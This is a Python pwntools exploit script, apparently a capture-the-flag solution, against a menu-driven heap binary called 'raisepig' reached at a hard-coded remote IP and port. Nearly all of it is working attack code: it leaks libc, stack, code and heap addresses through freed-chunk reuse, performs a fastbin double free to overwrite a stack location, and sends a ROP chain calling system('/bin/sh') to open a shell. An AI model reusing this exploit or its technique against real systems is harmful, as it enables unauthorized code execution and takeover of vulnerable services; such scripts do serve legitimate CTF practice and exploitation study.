#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./raisepig"
ENV = {"LD_PRELOAD":"./libc-64"}

unsorted_bin_off = 0x3c4b78
libc_argv_off = 0x3c92f8
target_off = 0x3c4aed
one_gadget_off = 0xf1117
bin_sh_off = 0x18cd17
system_off = 0x45390

pop_rdi_off = 0x1333

if len(sys.argv) > 1:
    one_gadget_off = int(sys.argv[1])

#p = process(elf, env=ENV)
p = remote("39.107.32.132", 9999)

def add(size, name, t):
    p.recvuntil("Your choice : ")
    p.sendline("1")
    p.recvuntil("Length of the name :")
    p.sendline(str(size))
    p.recvuntil("The name of pig :")
    p.sendline(name)
    p.recvuntil("The type of the pig :")
    p.sendline(t)

def show():
    p.recvuntil("Your choice : ")
    p.sendline("2")

def eat(idx):
    p.recvuntil("Your choice : ")
    p.sendline("3")
    p.recvuntil("Which pig do you want to eat:")
    p.sendline(str(idx))
    

def eatall():
    p.recvuntil("Your choice : ")
    p.sendline("4")


add(0x80, "A", "a")   # 0
add(0x28, "B", "b")   # 1
eat(0)
add(0x28, "A"*0x7, "a")  # 2
show()

p.recvuntil("A"*0x7+"\n")
libc_base = u64(p.recv(6).ljust(8, "\x00"))-unsorted_bin_off
log.info("libc_base: "+hex(libc_base))

target_addr = libc_base+target_off
one_gadget = libc_base+one_gadget_off
libc_argv_addr = libc_base+libc_argv_off
system_addr = libc_base+system_off
bin_sh_addr = libc_base+bin_sh_off

eat(2)
add(0x28, "CCCC", "c")  # 3

eat(2)
eat(3)

payload = p64(1)
payload += p64(libc_argv_addr)
add(0x28, payload, "d") # 4

show()
p.recvuntil("Name[3] :")
stack_addr = u64(p.recv(6).ljust(8, "\x00"))
log.info("stack_addr: "+hex(stack_addr))

code_addr_ptr = stack_addr-0x140

target_addr = stack_addr-0x18b
log.info("target_addr: "+hex(target_addr))

eat(2)
eat(1)

payload = p64(1)
payload += p64(code_addr_ptr)
add(0x28, payload, "d") # 5

show()
p.recvuntil("Name[3] :")
code_addr = u64(p.recv(6).ljust(8, "\x00"))
log.info("code_addr: "+hex(code_addr))

code_base = code_addr-0x10cd
log.info("code_base: "+hex(code_base))

pop_rdi_ret = code_base+pop_rdi_off

add(0x28, "tttt", "t")  # 6
eat(6)
eat(2)
show()

p.recvuntil("Name[5] :")
heap_addr = u64(p.recv(6).ljust(8, "\x00"))
log.info("heap_addr: "+hex(heap_addr))

bin_sh_addr = heap_addr+0x1e0

add(0x68, "DD", "d")    # 7
add(0x68, "EE", "e")    # 8

eat(7)
eat(8)
eat(7)
payload = p64(target_addr)+"\n"
add(0x68, payload, "ef")
add(0x68, "FFFF", "f")
add(0x68, "GGGG", "g")
add(0x28, "/bin/sh\x00", "b")

#payload = "/bin/sh"
#payload += p8(0)*(0x2b-len(payload))
payload = p8(0)*0x2b
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
#payload += p64(target_addr+0x10)
payload += p64(system_addr)

p.recvuntil("Your choice : ")
p.sendline("1")
p.recvuntil("Length of the name :")
p.sendline(str(0x68))
p.recvuntil("The name of pig :")
p.sendline(payload)

p.interactive()
